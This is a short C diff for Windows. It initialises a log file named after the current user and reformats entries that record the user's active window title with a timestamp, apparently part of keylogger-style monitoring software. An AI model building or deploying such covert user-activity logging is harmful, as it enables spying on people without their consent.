@@ -66,6 +66,11 @@ void CreateLogfile(char* filename){
     DWORD len = BUF_SIZE+1;
     GetUserName(username, &len);
     sprintf(filename, "%s_LOG.txt", username);
+
+    // initialize logfile upon execution
+    FILE* logfile = fopen(filename, "a");
+    fputs("BEGIN LOGGING...", logfile);
+    fclose(logfile);
 }
 
 // get the current working window of the user
@@ -82,7 +87,7 @@ void GetCurrentWindow(char* window, char* new_window, FILE* logfile){
             time_t curr_time = time(NULL);
             char* curr_time_str = ctime(&curr_time);
 
-            fprintf(logfile, "\n\nWINDOW: %s | TIME: %s", new_window, curr_time_str);
+            fprintf(logfile, "\n\nWINDOW: %s\nTIME: %s", new_window, curr_time_str);
             fflush(logfile);
         }
     }
